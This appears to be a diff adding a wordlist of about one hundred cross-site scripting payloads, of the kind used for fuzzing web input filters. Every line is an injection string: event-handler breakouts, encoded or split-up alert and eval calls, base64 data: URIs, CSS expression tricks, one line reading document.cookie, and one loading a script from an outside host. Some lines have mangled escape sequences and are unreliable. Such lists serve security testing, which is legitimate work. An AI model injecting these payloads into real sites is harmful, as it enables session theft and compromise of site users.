@@ -1,0 +1,100 @@
+/></track><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();
+ onmouseover='alert("xss".toUpperCase())
+!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(javascript:alert(1))" "
+!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><script>alert(1)</script>
+!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><script>alert(1)</script>
+!#%&)(*+,-./:;=?@]\[^_'}|{~<s><script>alert(1)</script>
+!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(javascript:alert(1))&#39; &#39;
+" onmouseover="alert('\u0058\u0053\u0053')
+" onmouseover="alert('&#0088;&#0083;&#0083;')
+" onmouseover="alert(/&#0088;&#0083;&#0083;/.source)
+"'><script>eval("alert(document\x2ecookie)")</script>
+"/onmousemove="window['\u0061lert']('\u0058SS')
+"/onmouseover="window['aler'+'t']('XS'+'S')">
+"&#39;><img src="javascript:alert(1)>
+"&#39;><script>alert(1)</script> onclick=alert(1)
+"</table><video><source onerror=javascript:window.onerror=alert();onerror=\u0061lert();
+"</table><video><source onerror=jAvaScrIpt:window.onerror=alert();onerror=\u0061lert();
+"><script>eval('u0061u006cu0065u0072u0074u0028u0027u0058u0053u0053u0027u0029');</script>
+"><script>eval("al"+"ert(1)");</script>
+"><svg><script>alert&#40/1/.source&#41</script>
+"onbeforepaste="&#000119indow['&#00097lert']('&#00088SS')" 
+"onblur="&#x0077indow['&#x0061lert']('&#x0058SS')" 
+"oncopy="&#0119indow['&#097lert']('&#088SS')" 
+"ondblclick="&#00119indow['&#0097lert']('&#0088SS')"
+"onKeyDown="document.write('<x73cript>x61lert(x22XSSx22)</x73cript>')"
+"onKeyPress="/127641/['constructor']['constructor']('al'+'ert'+'('+'''+1+'''+')')()
+"onKeyPress="u0077indow['u0061lert']('u0058SS')" 
+"onmouseover="&#x077indow['&#x061lert']('&#x058SS')" 
+"onmouseover="alert(decodeURI(decodeURI(/%58%53%53/.source)))"
+"onpaste="&#119indow['&#97lert']('&#88SS')" 
+"onSelectStart="/123441/['cons'+'truc'+'tor']['cons'+'truc'+'tor']('a'+'l'+'e'+'r'+'t'+'('+'''+'XS'+'S'+'''+')')()
+"onSelectStart="&#x00077indow['&#x00061lert']('&#x00058SS')"
+"st%00yle="behavior:\0075rl(bc)"onread%00ystatechange="ale%00rt(1)
+\u0061lert();script:\u0061lert();<video><source onerror=javascript:window.onerror=alert``;java
+&#39; style=&#39;background:url(javascript:alert(1))&#39; &#39;
+&#39;<s>&#39;><img src="javascript:alert(1)&#39;>
+&#39;<s>&#39;><script>alert(1)</script>
+&#39;><s><img src="javascript:alert(1)>
+&#x09;</track><video><source onerror=javascript:window.onerror=alert();\u0061lert``;
+&#x09;rel=<video><source <thead onerror=\u0061lert();
+#saivs.js <video><source onerror=javascript:window.onerror=alert();javascript:alert();
+%83%A1%82%83%A1%9E%83%A1%9Cscript%20%83%A1%9E%20alert(1)//%20%83%A1%9C/script%20%83%A1%9E
+%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E
+` onmouseover=`alert(/xss/.source.toUpperCase())
+</command>enctype=rows=<video><source onerror=alert();
+</form>al\u0065rt``;<video><source onerror=javascript:window.onerror=alert();alert();
+</frameset></track><video><source src=x onerror=javascript:window.onerror=alert();
+</iframe> /></textarea><video><source onerror=alert();
+<%u00df style="color:ex/***/pression(alert(1));"/>
+<a href="test:),< s c r i p t > a l e r t ( document.domain ) < / s c r i p t >">click me</a>
+<a href=data:html;base64,PHNjcmlwdD5hbGVydCgwKTs8L3NjcmlwdD4=>a</a>
+<body onload=alert(1); />
+<body onmouseover=alert(1); <canvas </basefont>
+<div style="color:\0065xpression(alert('XSS2'));">b</div>
+<div style="color:&#x65;xpression(alert(1));">a</div>
+<div style="left:&#x0065;xpression(alert(1))">
+<embed onload=alert();<script type="text/javascript">
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<embed/<a/onload=alert();?n<script type="text/javascript">
+<embed/onload=al?u0065rt();?n<script type="text/javascript">
+<embed/src=# onload=confirm();?n<script type="text/javascrip t">
+<frameset><frame/onload=alert(1); />
+<iframe onload=alert``; /><select
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
+<iframe src=# <keygen onload=alert();?n<script></script>
+<iframe/*/onload=charset=alert();>
+<iframe/onload=alert();>size=<command
+<iframe/onload=alert(1); />
+<img src= <meter onerror=alert();?n<script></script>
+<img src=# <keygen onerror=?u0061lert``;>
+<img src=x alt=confirm(1) onmouseover=eval(alt)>
+<keygen name="confirm(1)" onfocus="eval(this.name);" autofocus>
+<object/data=evil.html #</a>
+<object/onload="onfocus=alert();"<script type="text/javascri pt">
+<object/src=# onload=alert();?n<script type="text/javascript ">
+<object/src=x onload=alert(1);?n<script type="text/javascript">
+<progress </caption><video><source <body onerror=alert();
+<script src="data:text/html,al?u0065rt``;"<script></script>
+<script src="http://example.com/xss.jpg"></script>
+<script src=# <label onerror=confirm();?n<script></script>
+<script/src="data:text/html,alert();"<script></script>
+<script>al?u0065rt();</script></tr><th/
+<script>al?u0065rt();</script></tr><th/
+<script>onerror=?u0061lert(1);</script>
+<style><img src='</style><img src=x onerror=alert(1)//'>
+<svg/<canvas/<select/onload=confirm();>
+<svg/<canvas/<select/onload=confirm(1);>
+<svg/onload="?u0061lert();"></output>
+<svg/onload=al?u0065rt();?n<script type="text/javascript">
+<svg/onload=alert(1); </del>
+<svg><style><img/src=x onerror=alert(1)// </b>
+<video><source <tfoot <td onerror=javascript:window.onerror=alert();alert();
+al?u0065rt();<script>confirm();</script>
+colspan=<iframe <a onload=al?u0065rt();>
+icon=<body <input/onload=confirm(1);>
+icon=<iframe/<body onload=?u0061lert();>
+icon=<iframe/<img onload=al?u0065rt();>
+javascript:\u0061lert();</script><frameset><basefont/</td>
+kind=<body <img onload=alert``;>
+onerror=javascript:window.onerror=alert();</td><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();
